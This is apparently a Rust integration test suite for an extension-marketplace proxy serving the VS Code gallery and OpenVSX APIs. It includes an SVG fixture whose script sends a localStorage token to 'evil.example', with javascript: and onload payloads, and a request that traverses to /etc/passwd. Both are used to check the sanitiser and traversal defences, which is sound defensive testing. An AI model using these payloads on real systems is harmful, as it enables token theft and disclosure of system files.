//! BatleHub as an editor's extension marketplace.
//!
//! Before this existed the whole client surface was the raw VSIX download, so
//! an editor could not be pointed at BatleHub at all. These tests pin the two
//! client protocols that changed that — the VS Code gallery
//! (`extensionquery`, assets, `item`) and the OpenVSX REST API — and the
//! property that makes either of them worth having: **every URL in a response
//! points back at this proxy**, so downloads stay inside the cache, the audit
//! trail and the policy gates.
//!
//! See `tests/common/mod.rs` for the shared app-factory infrastructure.

mod common;
#[allow(unused_imports)]
use common::*;

use std::io::Write;

use actix_web::test::{call_service, read_body, read_body_json, TestRequest};
use batlehub_config::schema::RegistryMode;
use serde_json::{json, Value};

const EXT: &str = "acme.tool";
const VERSION: &str = "1.2.3";

/// A real VSIX: a ZIP with `extension/package.json` and the prose files an
/// editor's detail pane asks for. Built rather than faked because the asset
/// routes serve files *out of* it, so a placeholder would test nothing.
fn make_vsix() -> Vec<u8> {
    make_vsix_version(VERSION, false)
}

/// The same VSIX at a chosen version, optionally packaged as a pre-release.
///
/// `pre_release` writes the `extension.vsixmanifest` property `vsce package
/// --pre-release` writes — the *only* place that bit exists, since
/// `package.json` has no such field.
fn make_vsix_version(version: &str, pre_release: bool) -> Vec<u8> {
    let manifest = json!({
        "publisher": "acme",
        "name": "tool",
        "version": version,
        "displayName": "Acme Tool",
        "description": "Does the thing",
        "categories": ["Linters"],
        "keywords": ["acme"],
        "icon": "icon.png",
        "engines": { "vscode": "^1.85.0" }
    })
    .to_string();

    let pre_release_property = if pre_release {
        r#"<Property Id="Microsoft.VisualStudio.Code.PreRelease" Value="true" />"#
    } else {
        ""
    };
    let vsix_manifest = format!(
        r#"<?xml version="1.0" encoding="utf-8"?>
        <PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">
          <Metadata>
            <Identity Language="en-US" Id="tool" Version="{version}" Publisher="acme" />
            <DisplayName>Acme Tool</DisplayName>
          </Metadata>
          <Properties>
            <Property Id="Microsoft.VisualStudio.Code.Engine" Value="^1.85.0" />
            {pre_release_property}
          </Properties>
        </PackageManifest>"#
    );

    let mut buf = Vec::new();
    {
        let mut w = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let opts: zip::write::FileOptions<'_, ()> =
            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Stored);
        for (name, body) in [
            ("extension/package.json", manifest.as_bytes()),
            ("extension.vsixmanifest", vsix_manifest.as_bytes()),
            ("extension/README.md", b"# Acme Tool" as &[u8]),
            ("extension/CHANGELOG.md", b"## 1.2.3" as &[u8]),
            ("extension/LICENSE.txt", b"MIT" as &[u8]),
            ("extension/icon.png", b"\x89PNG\r\n\x1a\n" as &[u8]),
        ] {
            w.start_file(name, opts).unwrap();
            w.write_all(body).unwrap();
        }
        w.finish().unwrap();
    }
    buf
}

async fn gallery_app() -> impl actix_web::dev::Service<
    actix_http::Request,
    Response = actix_web::dev::ServiceResponse<actix_web::body::BoxBody>,
    Error = actix_web::Error,
> {
    let app = build_local_registry_app(
        local_registry_app_parts("local-vsx", "openvsx", RegistryMode::Local, None),
        batlehub_web::CargoIndexMap::default(),
        None,
    )
    .await;

    let req = TestRequest::put()
        .uri(&format!("/proxy/local-vsx/{EXT}/{VERSION}/vsix"))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .insert_header(("Content-Type", "application/octet-stream"))
        .set_payload(make_vsix())
        .to_request();
    let resp = call_service(&app, req).await;
    assert!(resp.status().is_success(), "publish: {}", resp.status());
    app
}

async fn query<S>(app: &S, body: Value) -> Value
where
    S: actix_web::dev::Service<
        actix_http::Request,
        Response = actix_web::dev::ServiceResponse<actix_web::body::BoxBody>,
        Error = actix_web::Error,
    >,
{
    let req = TestRequest::post()
        .uri("/proxy/local-vsx/vscode/gallery/extensionquery")
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .set_json(body)
        .to_request();
    let resp = call_service(app, req).await;
    assert_eq!(resp.status(), 200, "extensionquery should answer");
    read_body_json(resp).await
}

/// The flag set VS Code composes to resolve one extension: `IncludeFiles`,
/// `IncludeCategoryAndTags`, `IncludeVersionProperties`, `ExcludeNonValidated`,
/// `IncludeAssetUri`, `IncludeStatistics`, `IncludeLatestVersionOnly`.
///
/// `IncludeVersions` (0x1) is deliberately **absent** — the editor does not send
/// it for an install or an update check, and a fixture that adds it tests a
/// request no editor makes. That is how the empty-`versions` bug reached a real
/// `code --install-extension`.
const VSCODE_INSTALL_FLAGS: u32 = 0x2 | 0x4 | 0x10 | 0x20 | 0x80 | 0x100 | 0x200;

/// The body VS Code sends to resolve one extension — install and update both
/// take this path.
fn lookup_body(name: &str) -> Value {
    json!({
        "filters": [{
            "criteria": [
                { "filterType": 8, "value": "Microsoft.VisualStudio.Code" },
                { "filterType": 7, "value": name }
            ],
            "pageNumber": 1, "pageSize": 50, "sortBy": 0, "sortOrder": 0
        }],
        "assetTypes": [],
        "flags": VSCODE_INSTALL_FLAGS
    })
}

fn first_extension(doc: &Value) -> &Value {
    &doc["results"][0]["extensions"][0]
}

fn total_count(doc: &Value) -> u64 {
    doc["results"][0]["resultMetadata"][0]["metadataItems"][0]["count"]
        .as_u64()
        .expect("TotalCount")
}

// ── the gallery ──────────────────────────────────────────────────────────────

#[actix_web::test]
async fn an_exact_lookup_returns_the_extension_with_a_total_count() {
    let app = gallery_app().await;
    let doc = query(&app, lookup_body(EXT)).await;

    assert_eq!(total_count(&doc), 1, "the editor pages against this");
    let e = first_extension(&doc);
    assert_eq!(e["publisher"]["publisherName"], "acme");
    assert_eq!(e["extensionName"], "tool");
    assert_eq!(e["displayName"], "Acme Tool");
    assert_eq!(e["versions"][0]["version"], VERSION);
}

/// The editor's install path, end to end: resolve by id with the flags a real
/// `code --install-extension <id>` sends, then fetch the package from the
/// `files` entry that response advertised.
///
/// `tests/heavy/marketplace.sh` runs the same scenario against a real editor,
/// and that is where this first failed — the response carried `versions: []`
/// because the request did not set `IncludeVersions`, and VS Code died with
/// `Cannot read properties of undefined (reading 'files')`.
#[actix_web::test]
async fn an_install_by_id_resolves_a_version_and_its_package() {
    let app = gallery_app().await;
    let doc = query(&app, lookup_body(EXT)).await;

    let e = first_extension(&doc);
    assert!(
        e["flags"].as_str().is_some_and(|f| !f.is_empty()),
        "the editor calls flags.indexOf(\"preview\") without a guard"
    );
    assert!(
        e["lastUpdated"].is_string() && e["releaseDate"].is_string(),
        "both are Date.parsed, and the extension pane shows them"
    );

    let version = &e["versions"][0];
    assert_eq!(
        version["version"], VERSION,
        "the editor reads versions[0] without checking that it exists"
    );

    let source = version["files"]
        .as_array()
        .expect("files")
        .iter()
        .find(|f| f["assetType"] == "Microsoft.VisualStudio.Services.VSIXPackage")
        .and_then(|f| f["source"].as_str())
        .expect("the VSIX asset the editor downloads")
        .to_owned();

    // The advertised URL is absolute (that is the point of it); call it back as
    // a path against this app.
    let path = source
        .split_once("://")
        .map_or(&source[..], |(_, rest)| rest);
    let path = &path[path.find('/').expect("an absolute URL has a path")..];

    let req = TestRequest::get()
        .uri(path)
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(&app, req).await;
    assert_eq!(resp.status(), 200, "GET {path}");
    assert_eq!(&read_body(resp).await[..2], b"PK");
}

/// A pre-release must reach the editor marked as one.
///
/// This is the one version-level marker that changes what gets *installed*: VS
/// Code hides a pre-release from anyone who did not opt in
/// (`if (!includePreRelease && properties.isPreReleaseVersion) return false`), so
/// a lost marker offers a release-candidate build to everybody as the release.
/// And it only exists in `extension.vsixmanifest`, never in `package.json`.
///
/// Published through `/api/-/publish` — what `ovsx publish --pre-release` calls,
/// and the route that takes its whole coordinate from the archive.
#[actix_web::test]
async fn a_pre_release_version_is_reported_as_a_pre_release() {
    const PRE_RELEASE_VERSION: &str = "2.0.0-rc.1";
    const PRE_RELEASE_KEY: &str = "Microsoft.VisualStudio.Code.PreRelease";

    let app = gallery_app().await;
    let req = TestRequest::post()
        .uri("/proxy/local-vsx/api/-/publish")
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .set_payload(make_vsix_version(PRE_RELEASE_VERSION, true))
        .to_request();
    let resp = call_service(&app, req).await;
    assert_eq!(resp.status(), 201, "ovsx-style publish");

    // Every version, so the two can be compared without depending on which of
    // them sorts newest.
    let doc = query(
        &app,
        json!({
            "filters": [{ "criteria": [{ "filterType": 7, "value": EXT }] }],
            "flags": 0x1 | 0x2 | 0x10
        }),
    )
    .await;
    let versions = first_extension(&doc)["versions"]
        .as_array()
        .expect("versions");
    let property = |version: &str, key: &str| -> Option<String> {
        versions.iter().find(|v| v["version"] == version)?["properties"]
            .as_array()?
            .iter()
            .find(|p| p["key"] == key)?["value"]
            .as_str()
            .map(str::to_owned)
    };

    assert_eq!(
        property(PRE_RELEASE_VERSION, PRE_RELEASE_KEY).as_deref(),
        Some("true"),
        "the editor gates the install on this property"
    );
    assert_eq!(
        property(VERSION, PRE_RELEASE_KEY),
        None,
        "the release published before it must stay a release"
    );

    // The OpenVSX document reports the same bit, per version.
    let (status, doc) = api_get(
        &app,
        &format!("/proxy/local-vsx/api/acme/tool/{PRE_RELEASE_VERSION}"),
    )
    .await;
    assert_eq!(status, 200);
    assert_eq!(doc["preRelease"], true);

    let (status, doc) = api_get(&app, &format!("/proxy/local-vsx/api/acme/tool/{VERSION}")).await;
    assert_eq!(status, 200);
    assert_eq!(doc["preRelease"], false);
}

/// The query a real editor makes when the newest version is a pre-release and
/// the user did not opt in: it re-asks by **uuid** (filter type 4) with
/// `IncludeVersions`, and picks the newest release out of the history.
///
/// That lookup does not take the by-name fast path — it falls through to the
/// registry scan, which used to report only each extension's newest version. VS
/// Code then saw a history containing nothing but the pre-release and refused the
/// install with "has no release version".
#[actix_web::test]
async fn a_uuid_lookup_returns_the_whole_version_history() {
    let app = gallery_app().await;
    let req = TestRequest::post()
        .uri("/proxy/local-vsx/api/-/publish")
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .set_payload(make_vsix_version("2.0.0-rc.1", true))
        .to_request();
    assert_eq!(call_service(&app, req).await.status(), 201);

    // The uuid as the editor learned it, from the extension itself.
    let uuid = first_extension(&query(&app, lookup_body(EXT)).await)["extensionId"]
        .as_str()
        .expect("extensionId")
        .to_owned();

    let doc = query(
        &app,
        json!({
            "filters": [{ "criteria": [{ "filterType": 4, "value": uuid }] }],
            "flags": 0x1 | 0x2 | 0x10
        }),
    )
    .await;

    assert_eq!(total_count(&doc), 1, "the uuid resolves to one extension");
    let versions: Vec<&str> = first_extension(&doc)["versions"]
        .as_array()
        .expect("versions")
        .iter()
        .map(|v| v["version"].as_str().unwrap_or_default())
        .collect();
    assert!(
        versions.contains(&"2.0.0-rc.1") && versions.contains(&VERSION),
        "the whole history, so a pre-release can fall back to a release: {versions:?}"
    );
}

#[actix_web::test]
async fn an_unknown_extension_is_an_empty_result_not_an_error() {
    let app = gallery_app().await;
    let doc = query(&app, lookup_body("nobody.nothing")).await;

    assert_eq!(total_count(&doc), 0);
    assert_eq!(doc["results"][0]["extensions"], json!([]));
}

/// The property the whole feature rests on: served with upstream URLs, every
/// download would route around the cache, the audit trail and the download
/// gate.
#[actix_web::test]
async fn every_url_in_the_response_points_at_this_proxy() {
    let app = gallery_app().await;
    let doc = query(&app, lookup_body(EXT)).await;
    let v = &first_extension(&doc)["versions"][0];

    let asset_uri = v["assetUri"].as_str().expect("assetUri");
    assert!(
        asset_uri.ends_with("/proxy/local-vsx/vscode/asset/acme/tool/1.2.3"),
        "assetUri was {asset_uri}"
    );
    assert_eq!(v["assetUri"], v["fallbackAssetUri"]);

    let rendered = serde_json::to_string(&doc).unwrap();
    assert!(
        !rendered.contains("marketplace.visualstudio.com") && !rendered.contains("open-vsx.org"),
        "an upstream URL leaked into the response: {rendered}"
    );
}

#[actix_web::test]
async fn the_engine_range_is_reported_so_the_editor_can_judge_compatibility() {
    let app = gallery_app().await;
    let doc = query(&app, lookup_body(EXT)).await;

    let props = first_extension(&doc)["versions"][0]["properties"]
        .as_array()
        .expect("properties");
    let engine = props
        .iter()
        .find(|p| p["key"] == "Microsoft.VisualStudio.Code.Engine")
        .expect("the editor refuses a version whose engine it cannot read");
    assert_eq!(engine["value"], "^1.85.0");
}

/// A query for a different editor, or for a curated list this registry does not
/// keep, answers with nothing rather than with the whole catalogue.
#[actix_web::test]
async fn an_unanswerable_query_returns_nothing_rather_than_everything() {
    let app = gallery_app().await;

    for criteria in [
        json!([{ "filterType": 8, "value": "Microsoft.VisualStudio.IDE" }]),
        json!([{ "filterType": 9, "value": "" }]),
    ] {
        let doc = query(
            &app,
            json!({ "filters": [{ "criteria": criteria }], "flags": 0x1 }),
        )
        .await;
        assert_eq!(total_count(&doc), 0, "criteria {criteria} should be empty");
    }
}

#[actix_web::test]
async fn free_text_search_finds_the_extension() {
    let app = gallery_app().await;
    let doc = query(
        &app,
        json!({
            "filters": [{ "criteria": [{ "filterType": 10, "value": "acme" }] }],
            "flags": 0x1
        }),
    )
    .await;

    assert_eq!(total_count(&doc), 1);
    assert_eq!(first_extension(&doc)["extensionName"], "tool");
}

// ── assets ───────────────────────────────────────────────────────────────────

async fn asset<S>(app: &S, asset_type: &str) -> (u16, String, Vec<u8>)
where
    S: actix_web::dev::Service<
        actix_http::Request,
        Response = actix_web::dev::ServiceResponse<actix_web::body::BoxBody>,
        Error = actix_web::Error,
    >,
{
    let req = TestRequest::get()
        .uri(&format!(
            "/proxy/local-vsx/vscode/asset/acme/tool/{VERSION}/{asset_type}"
        ))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(app, req).await;
    let status = resp.status().as_u16();
    let ct = resp
        .headers()
        .get("content-type")
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default()
        .to_owned();
    (status, ct, read_body(resp).await.to_vec())
}

#[actix_web::test]
async fn every_advertised_asset_type_serves_its_bytes() {
    let app = gallery_app().await;

    let (status, ct, body) = asset(&app, "Microsoft.VisualStudio.Code.Manifest").await;
    assert_eq!(status, 200);
    assert!(ct.starts_with("application/json"), "manifest ct was {ct}");
    assert_eq!(
        serde_json::from_slice::<Value>(&body).unwrap()["name"],
        "tool"
    );

    let (status, ct, body) = asset(&app, "Microsoft.VisualStudio.Services.Content.Details").await;
    assert_eq!(status, 200);
    assert!(ct.starts_with("text/markdown"), "README ct was {ct}");
    assert_eq!(body, b"# Acme Tool");

    let (status, _, body) = asset(&app, "Microsoft.VisualStudio.Services.Content.Changelog").await;
    assert_eq!(status, 200);
    assert_eq!(body, b"## 1.2.3");

    let (status, _, body) = asset(&app, "Microsoft.VisualStudio.Services.Content.License").await;
    assert_eq!(status, 200);
    assert_eq!(body, b"MIT");

    let (status, ct, _) = asset(&app, "Microsoft.VisualStudio.Services.Icons.Default").await;
    assert_eq!(status, 200);
    assert_eq!(ct, "image/png");

    let (status, _, body) = asset(&app, "Microsoft.VisualStudio.Services.VSIXPackage").await;
    assert_eq!(status, 200);
    assert_eq!(&body[..2], b"PK", "the package itself is the archive");
}

/// An extension that ships no changelog is a `404` for that asset, not a
/// failure of the whole listing.
#[actix_web::test]
async fn an_asset_type_the_extension_does_not_ship_is_a_404() {
    let app = build_local_registry_app(
        local_registry_app_parts("local-vsx", "openvsx", RegistryMode::Local, None),
        batlehub_web::CargoIndexMap::default(),
        None,
    )
    .await;

    // Published with a manifest and nothing else.
    let mut buf = Vec::new();
    {
        let mut w = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let opts: zip::write::FileOptions<'_, ()> = zip::write::FileOptions::default();
        w.start_file("extension/package.json", opts).unwrap();
        w.write_all(br#"{"publisher":"acme","name":"tool","version":"1.2.3"}"#)
            .unwrap();
        w.finish().unwrap();
    }
    let req = TestRequest::put()
        .uri(&format!("/proxy/local-vsx/{EXT}/{VERSION}/vsix"))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .set_payload(buf)
        .to_request();
    assert!(call_service(&app, req).await.status().is_success());

    let (status, _, _) = asset(&app, "Microsoft.VisualStudio.Services.Content.Changelog").await;
    assert_eq!(status, 404);
}

// ── an SVG icon (RFC 0007-bis §11 q1) ────────────────────────────────────────

/// A VSIX whose manifest names an SVG icon, carrying whatever `svg` is.
///
/// The manifest's `icon` field is what `resolve_asset_path` follows, so the file
/// has to be named there and not merely be present in the archive.
fn vsix_with_svg_icon(svg: &[u8]) -> Vec<u8> {
    let manifest = json!({
        "publisher": "acme",
        "name": "tool",
        "version": VERSION,
        "displayName": "Acme Tool",
        "icon": "icon.svg",
        "engines": { "vscode": "^1.85.0" }
    })
    .to_string();

    let mut buf = Vec::new();
    {
        let mut w = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let opts: zip::write::FileOptions<'_, ()> =
            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Stored);
        for (name, body) in [
            ("extension/package.json", manifest.as_bytes()),
            ("extension/icon.svg", svg),
        ] {
            w.start_file(name, opts).unwrap();
            w.write_all(body).unwrap();
        }
        w.finish().unwrap();
    }
    buf
}

async fn app_with_svg_icon(
    svg: &[u8],
) -> impl actix_web::dev::Service<
    actix_http::Request,
    Response = actix_web::dev::ServiceResponse<actix_web::body::BoxBody>,
    Error = actix_web::Error,
> {
    let app = build_local_registry_app(
        local_registry_app_parts("local-vsx", "openvsx", RegistryMode::Local, None),
        batlehub_web::CargoIndexMap::default(),
        None,
    )
    .await;
    let req = TestRequest::put()
        .uri(&format!("/proxy/local-vsx/{EXT}/{VERSION}/vsix"))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .insert_header(("Content-Type", "application/octet-stream"))
        .set_payload(vsix_with_svg_icon(svg))
        .to_request();
    assert!(call_service(&app, req).await.status().is_success());
    app
}

/// The icon renders, and what it carried does not.
///
/// Every SVG icon used to leave here as `application/octet-stream` — no icon in
/// the editor, no icon in the console — because nothing in this crate could
/// vouch for one. The README image proxy could, and RFC 0007-bis §11 q1 is the
/// decision to share it rather than keep it a README's private arrangement.
#[actix_web::test]
async fn an_svg_icon_is_sanitised_and_served_as_an_image() {
    let app = app_with_svg_icon(
        br##"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
              <script>fetch('//evil.example/'+localStorage.token)</script>
              <a href="javascript:alert(1)">a link a reader cannot inspect</a>
              <circle cx="8" cy="8" r="7" fill="#09f"/>
              <rect width="16" height="16" fill="#fff" onload="alert(1)"/>
            </svg>"##,
    )
    .await;

    let req = TestRequest::get()
        .uri(&format!(
            "/proxy/local-vsx/vscode/asset/acme/tool/{VERSION}/Microsoft.VisualStudio.Services.Icons.Default"
        ))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(&app, req).await;

    assert_eq!(resp.status(), 200);
    assert_eq!(
        resp.headers().get("content-type").unwrap(),
        "image/svg+xml",
        "an icon the sanitiser vouched for is an image, not a download"
    );
    // The second of §7.2's two controls, and the one that holds even if the
    // first is wrong. It has to be on the response, not merely on the middleware
    // that would have supplied a policy for the whole `/proxy` prefix.
    let csp = resp
        .headers()
        .get("content-security-policy")
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default()
        .to_owned();
    assert!(csp.contains("sandbox"), "CSP was {csp}");

    let body = String::from_utf8(read_body(resp).await.to_vec()).unwrap();
    assert!(!body.contains("script"), "script survived: {body}");
    assert!(
        !body.contains("onload"),
        "an event handler survived: {body}"
    );
    assert!(
        !body.contains("javascript:"),
        "a javascript: URL survived: {body}"
    );
    assert!(!body.contains("<a"), "a link survived: {body}");
    assert!(
        body.contains("<circle"),
        "the drawing itself must survive: {body}"
    );
}

/// The file routes hand back what the publisher shipped.
///
/// `serve_entry` backs three routes and only one of them advertises a file as
/// an image: the gallery's `Icons.Default` asset. The other two — `vscode/unpkg`
/// (`resourceUrlTemplate`, which is how a **web extension loads its own
/// resources**) and OpenVSX's `…/file/{name}` — serve arbitrary files, and the
/// sanitiser must not touch them. Its allow-list drops `use`, `symbol`, `style`
/// and `filter`, so an extension shipping an icon sprite would be handed back a
/// blank drawing by a route that is supposed to be a file server.
///
/// The same bytes, through both routes, is the assertion: the sprite survives
/// on `unpkg` and is refused rendering as an image, while the icon asset in the
/// test above is sanitised.
#[actix_web::test]
async fn a_file_route_serves_the_publishers_svg_unchanged() {
    let sprite = br##"<svg xmlns="http://www.w3.org/2000/svg"><symbol id="a"><circle r="4"/></symbol><use href="#a"/></svg>"##;
    let app = app_with_svg_icon(sprite).await;

    let req = TestRequest::get()
        .uri(&format!(
            "/proxy/local-vsx/vscode/unpkg/acme/tool/{VERSION}/icon.svg"
        ))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(&app, req).await;

    assert_eq!(resp.status(), 200);
    assert_eq!(
        resp.headers().get("content-type").unwrap(),
        "application/octet-stream",
        "a file route must not declare a publisher's SVG a renderable document"
    );
    assert_eq!(
        read_body(resp).await,
        sprite.as_slice(),
        "the file route rewrote the publisher's bytes"
    );
}

/// A document the sanitiser refuses stays the opaque download it always was.
///
/// Not a `404`: the bytes are the extension's and a client may still want them.
/// What must not happen is a browser parsing them as a document from this
/// origin, and the type is what stops that.
#[actix_web::test]
async fn an_svg_icon_the_sanitiser_refuses_stays_a_download() {
    // Invalid UTF-8 rather than a stray tag: the reader validates the encoding
    // and fails the whole document, which is the refusal this asserts. A merely
    // untidy document is sanitised like any other.
    let app = app_with_svg_icon(b"<svg><title>\xff\xfe</title></svg>").await;

    let req = TestRequest::get()
        .uri(&format!(
            "/proxy/local-vsx/vscode/asset/acme/tool/{VERSION}/Microsoft.VisualStudio.Services.Icons.Default"
        ))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(&app, req).await;

    assert_eq!(resp.status(), 200);
    assert_eq!(
        resp.headers().get("content-type").unwrap(),
        "application/octet-stream"
    );
}

#[actix_web::test]
async fn vspackage_serves_the_package() {
    let app = gallery_app().await;

    let req = TestRequest::get()
        .uri(&format!(
            "/proxy/local-vsx/vscode/gallery/publishers/acme/vsextensions/tool/{VERSION}/vspackage"
        ))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(&app, req).await;

    assert_eq!(resp.status(), 200);
    assert_eq!(&read_body(resp).await[..2], b"PK");
}

#[actix_web::test]
async fn unpkg_serves_a_file_and_rejects_traversal() {
    let app = gallery_app().await;

    let ok = TestRequest::get()
        .uri(&format!(
            "/proxy/local-vsx/vscode/unpkg/acme/tool/{VERSION}/README.md"
        ))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(&app, ok).await;
    assert_eq!(resp.status(), 200);
    assert_eq!(read_body(resp).await, b"# Acme Tool".as_slice());

    let evil = TestRequest::get()
        .uri(&format!(
            "/proxy/local-vsx/vscode/unpkg/acme/tool/{VERSION}/../../../etc/passwd"
        ))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    assert_ne!(
        call_service(&app, evil).await.status(),
        200,
        "a traversal must never succeed"
    );
}

#[actix_web::test]
async fn item_redirects_to_the_console_page() {
    let app = gallery_app().await;

    let req = TestRequest::get()
        .uri(&format!("/proxy/local-vsx/vscode/item?itemName={EXT}"))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(&app, req).await;

    assert_eq!(resp.status(), 302);
    let location = resp
        .headers()
        .get("location")
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default();
    assert!(
        location.contains("/packages/local-vsx/"),
        "location was {location}"
    );
}

/// Route-ordering guard. `vscode/item` is two segments, exactly the shape of
/// the shared npm `{name}/{version}` wildcard, so it is only reachable while
/// the gallery routes stay registered ahead of it.
#[actix_web::test]
async fn the_gallery_routes_are_not_swallowed_by_the_npm_wildcards() {
    let app = gallery_app().await;

    let req = TestRequest::get()
        .uri(&format!("/proxy/local-vsx/vscode/item?itemName={EXT}"))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(&app, req).await;

    assert_eq!(
        resp.status(),
        302,
        "a 200 here means the npm version route answered instead"
    );
}

// ── the OpenVSX API ──────────────────────────────────────────────────────────

async fn api_get<S>(app: &S, path: &str) -> (u16, Value)
where
    S: actix_web::dev::Service<
        actix_http::Request,
        Response = actix_web::dev::ServiceResponse<actix_web::body::BoxBody>,
        Error = actix_web::Error,
    >,
{
    let req = TestRequest::get()
        .uri(path)
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(app, req).await;
    let status = resp.status().as_u16();
    (status, read_body_json(resp).await)
}

#[actix_web::test]
async fn the_openvsx_api_describes_the_extension() {
    let app = gallery_app().await;

    let (status, doc) = api_get(&app, "/proxy/local-vsx/api/acme/tool").await;
    assert_eq!(status, 200);
    assert_eq!(doc["namespace"], "acme");
    assert_eq!(doc["name"], "tool");
    assert_eq!(doc["version"], VERSION);
    assert_eq!(doc["displayName"], "Acme Tool");

    let download = doc["files"]["download"].as_str().unwrap_or_default();
    assert!(
        download.contains("/proxy/local-vsx/vscode/asset/acme/tool/"),
        "download URL was {download}"
    );
}

#[actix_web::test]
async fn the_openvsx_api_serves_a_pinned_version_and_404s_an_absent_one() {
    let app = gallery_app().await;

    let (status, doc) = api_get(&app, &format!("/proxy/local-vsx/api/acme/tool/{VERSION}")).await;
    assert_eq!(status, 200);
    assert_eq!(doc["version"], VERSION);

    let (status, _) = api_get(&app, "/proxy/local-vsx/api/acme/tool/9.9.9").await;
    assert_eq!(status, 404);
}

/// `-` must not be read as a publisher name, which is only true while
/// `api/-/search` is registered ahead of `api/{namespace}/{extension}`.
#[actix_web::test]
async fn openvsx_search_is_not_taken_for_a_namespace() {
    let app = gallery_app().await;

    let (status, doc) = api_get(&app, "/proxy/local-vsx/api/-/search?query=acme").await;
    assert_eq!(status, 200);
    assert_eq!(doc["totalSize"], 1);
    assert_eq!(doc["extensions"][0]["name"], "tool");
    assert_eq!(doc["extensions"][0]["namespace"], "acme");
}

#[actix_web::test]
async fn the_openvsx_api_serves_files_out_of_the_extension() {
    let app = gallery_app().await;

    let req = TestRequest::get()
        .uri(&format!(
            "/proxy/local-vsx/api/acme/tool/{VERSION}/file/acme.tool-{VERSION}.vsix"
        ))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(&app, req).await;
    assert_eq!(resp.status(), 200);
    assert_eq!(&read_body(resp).await[..2], b"PK");

    let req = TestRequest::get()
        .uri(&format!(
            "/proxy/local-vsx/api/acme/tool/{VERSION}/file/README.md"
        ))
        .insert_header(("Authorization", bearer(ADMIN_TOKEN)))
        .to_request();
    let resp = call_service(&app, req).await;
    assert_eq!(resp.status(), 200);
    assert_eq!(read_body(resp).await, b"# Acme Tool".as_slice());
}

/// The gallery is a read surface like any other: an identity the registry does
/// not admit gets a refusal, not a quietly empty catalogue.
#[actix_web::test]
async fn an_unauthorised_identity_is_refused_rather_than_shown_nothing() {
    let app = gallery_app().await;

    let req = TestRequest::get()
        .uri("/proxy/local-vsx/api/acme/tool")
        .to_request();
    assert_eq!(
        call_service(&app, req).await.status(),
        403,
        "anonymous has releases:read but not source:read on this registry"
    );
}

/// A lookup by `extensionId` (filterType 4) resolves too. The id is a uuid
/// derived from the name, so it cannot take the fast name-lookup path — this
/// pins that it still finds the extension rather than answering with nothing.
#[actix_web::test]
async fn a_lookup_by_extension_id_resolves() {
    let app = gallery_app().await;

    let by_name = query(&app, lookup_body(EXT)).await;
    let id = first_extension(&by_name)["extensionId"]
        .as_str()
        .expect("extensionId")
        .to_owned();

    let by_id = query(
        &app,
        json!({
            "filters": [{ "criteria": [{ "filterType": 4, "value": id }] }],
            "flags": 0x1
        }),
    )
    .await;

    assert_eq!(total_count(&by_id), 1);
    assert_eq!(first_extension(&by_id)["extensionName"], "tool");
}
